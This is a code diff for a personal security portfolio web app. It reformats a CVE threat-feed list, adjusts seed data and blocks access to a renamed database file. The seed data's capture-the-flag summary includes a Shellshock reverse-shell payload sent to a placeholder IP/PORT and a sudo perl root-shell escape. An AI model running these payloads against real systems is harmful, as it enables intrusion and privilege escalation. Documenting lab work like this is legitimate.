@@ -20,13 +20,13 @@ async function fetchThreatFeed() {
     { sev: 'crit', text: 'CVE-2024-3400 · Palo Alto PAN-OS RCE — CVSS 10.0', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3400' },
     { sev: 'high', text: 'CVE-2024-21762 · Fortinet SSL-VPN auth bypass — CVSS 9.6', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21762' },
     { sev: 'crit', text: 'CVE-2024-27198 · JetBrains TeamCity auth bypass — CVSS 9.8', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-27198' },
-    { sev: 'med',  text: 'CVE-2024-23897 · Jenkins arbitrary file read — CVSS 7.5', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-23897' },
+    { sev: 'med', text: 'CVE-2024-23897 · Jenkins arbitrary file read — CVSS 7.5', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-23897' },
     { sev: 'high', text: 'CVE-2024-1709 · ConnectWise ScreenConnect path traversal — CVSS 9.8', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-1709' },
     { sev: 'crit', text: 'CVE-2023-46604 · Apache ActiveMQ RCE (actively exploited)', link: 'https://nvd.nist.gov/vuln/detail/CVE-2023-46604' },
     { sev: 'high', text: 'CVE-2024-4577 · PHP CGI argument injection — CVSS 9.8', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-4577' },
     { sev: 'high', text: 'CVE-2024-38080 · Windows Hyper-V Zero-day (in-the-wild)', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-38080' },
     { sev: 'crit', text: 'CVE-2024-30078 · Windows WiFi Driver RCE — CVSS 8.8', link: 'https://nvd.nist.gov/vuln/detail/CVE-2024-30078' },
-    { sev: 'med',  text: 'Midnight Blizzard APT targeting government orgs via spear-phishing', link: '#' },
+    { sev: 'med', text: 'Midnight Blizzard APT targeting government orgs via spear-phishing', link: '#' },
   ];
 
   try {
@@ -44,14 +44,14 @@ async function fetchThreatFeed() {
     const data = await resp.json();
 
     const items = (data.vulnerabilities || []).slice(0, 12).map(v => {
-      const cve  = v.cve;
-      const id   = cve.id;
+      const cve = v.cve;
+      const id = cve.id;
       const desc = (cve.descriptions || []).find(d => d.lang === 'en')?.value || 'No description';
       const shortDesc = desc.length > 90 ? desc.slice(0, 87) + '...' : desc;
       const cvss = cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore
-                || cve.metrics?.cvssMetricV30?.[0]?.cvssData?.baseScore
-                || cve.metrics?.cvssMetricV2?.[0]?.cvssData?.baseScore
-                || null;
+        || cve.metrics?.cvssMetricV30?.[0]?.cvssData?.baseScore
+        || cve.metrics?.cvssMetricV2?.[0]?.cvssData?.baseScore
+        || null;
       const score = cvss ? ` — CVSS ${cvss}` : '';
       const sev = cvss >= 9 ? 'crit' : cvss >= 7 ? 'high' : 'med';
       return { sev, text: `${id} · ${shortDesc}${score}`, link: `https://nvd.nist.gov/vuln/detail/${id}` };
@@ -151,7 +151,7 @@ const defaultSeed = {
         "Further fuzzing finds user.sh — a bash CGI script",
         "Craft Shellshock payload in User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1",
         "Catch reverse shell as www-data",
-        "sudo -l shows perl NOPASSWD — sudo perl -e 'exec "/bin/sh"' gives root"
+        "sudo -l shows perl NOPASSWD — sudo perl -e 'exec \"/bin/sh\"' gives root"
       ],
       "writeupUrl": "https://github.com/sanketjaybhaye/Hacking_Stuff",
       "completedAt": "2024-11"
@@ -821,10 +821,10 @@ app.post('/api/contact', rateLimit(15 * 60 * 1000, 3), (req, res) => {
   };
   db.get('messages').push(entry).write();
   console.log(`[MSG] ${entry.timestamp} | From: ${entry.name} <${entry.email}>`);
-  
+
   // Fire ghost reply asynchronously (doesn't block the response)
   sendGhostReply(entry.email, entry.name);
-  
+
   res.json({ success: true, id: entry.id });
 });
 
@@ -837,8 +837,9 @@ app.get('/api/messages', (req, res) => {
   res.json(db.get('messages').value());
 });
 
-// Block direct access to database file
+// Block direct access to database files
 app.get('/portfolio.db.json', (req, res) => res.status(403).json({ error: 'Forbidden' }));
+app.get('/portfolio_v2.db.json', (req, res) => res.status(403).json({ error: 'Forbidden' }));
 
 // SPA fallback — serve index.html for any unknown route
 app.use((req, res) => {
@@ -861,5 +862,5 @@ app.listen(PORT, () => {
   console.log(`\n  ██ null_byte portfolio`);
   console.log(`  ▸ Local:   http://localhost:${PORT}`);
   console.log(`  ▸ Mode:    ${process.env.NODE_ENV || 'development'}`);
-  console.log(`  ▸ DB:      portfolio.db.json\n`);
+  console.log(`  ▸ DB:      portfolio_v2.db.json\n`);
 });
